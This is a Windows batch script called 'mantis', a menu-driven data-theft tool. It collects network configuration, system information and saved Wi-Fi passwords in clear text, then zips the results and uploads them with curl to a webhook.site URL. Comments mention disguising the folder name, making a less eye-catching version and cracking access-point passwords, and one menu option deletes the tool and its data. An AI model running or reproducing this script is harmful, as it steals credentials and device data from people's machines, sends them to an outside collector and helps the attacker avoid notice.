@echo off 
title mantis
chcp 65001 >nul
if not exist data mkdir data

::change folder name for disguise
set MainDirectoryPath=C:\\TEST_SP
set DataDirectoryPath=%MainDirectoryPath%\data

set WebhookCode=fe71a9ce-eda7-445e-9718-ca3aed24091a
set WebhookUrl=https://webhook.site/%WebhookCode%
set WebhookSite=https://webhook.site/#!/view/%WebhookCode%

:menu
cls
cd %MainDirectoryPath%

call :banner
echo       ╔══(1) open_cmd [avilable]
echo       ║
echo       ╠═══(2) get_network_info [avilable]
echo       ║
echo       ╠════(3) get_device_info [avilable]
echo       ║
echo       ╠═════(4) get_previous_connectrd_wi-fi_info [avilable]
echo       ║
echo       ╠══════(5) send_to_webhook [avilable]
echo       ║
echo       ╠═══════(6) exit [avilable]
echo       ║
echo       ╠════════(7) open_webhook_website [avilable]
echo       ║
echo       ╚═╦═══════(8) exit_and_delete [avilable]
echo         ║
set /p MenuSelect="ˑ       ╚══════════˃ "

if %MenuSelect% equ 1 goto :1
if %MenuSelect% equ 2 goto :2
if %MenuSelect% equ 3 goto :3
if %MenuSelect% equ 4 goto :4
if %MenuSelect% equ 5 goto :5
if %MenuSelect% equ 6 goto :6
if %MenuSelect% equ 7 goto :7
if %MenuSelect% equ 8 goto :8=

echo.
echo         ╔═══════════════════╗
echo         ║ invalid selection ║
echo         ╚═══════════════════╝
echo.
pause >nul
goto :menu

::cmd
:1
start
goto :menu

::get network info
:2
cd data
ipconfig /all > ipconfig
goto :menu

::system info
:3
cd data
systeminfo > systeminfo
goto :menu

::wifi
:4
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > %DataDirectoryPath%\wifi_passwords
del Wi-* /s /f /q
goto :menu

::send to webhook
:5
del data.zip
powershell Compress-Archive -Path "C:\\TEST_SP\data" -DestinationPath "C:\\TEST_SP\data.zip"
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%MainDirectoryPath%\data.zip" %WebhookUrl%
goto :menu

::exit
:6
exit

::open webkook website
:7
start %WebhookSite%
goto :menu

::exit & delete
:8
rmdir /s /q "%MainDirectoryPath%"
pause
goto :menu

::more info (netstat)
::check if online, if not go to offline mode or crack AP passwords
::MANTIS
::MANTIS LITE (less eye catching, no banner, just functional things)
::change menu numbers to names (not in lite)
::netstat menu
::shortcut

:banner
echo.
echo.
echo      ██████   ██████   █████████   ██████   █████ ███████████ █████  █████████ 
echo     ░░██████ ██████   ███░░░░░███ ░░██████ ░░███ ░█░░░███░░░█░░███  ███░░░░░███
echo      ░███░█████░███  ░███    ░███  ░███░███ ░███ ░   ░███  ░  ░███ ░███    ░░░ 
echo      ░███░░███ ░███  ░███████████  ░███░░███░███     ░███     ░███ ░░█████████ 
echo      ░███ ░░░  ░███  ░███░░░░░███  ░███ ░░██████     ░███     ░███  ░░░░░░░░███
echo      ░███      ░███  ░███    ░███  ░███  ░░█████     ░███     ░███  ███    ░███
echo      █████     █████ █████   █████ █████  ░░█████    █████    █████░░█████████ 
echo     ░░░░░     ░░░░░ ░░░░░   ░░░░░ ░░░░░    ░░░░░    ░░░░░    ░░░░░  ░░░░░░░░░  
echo.
echo.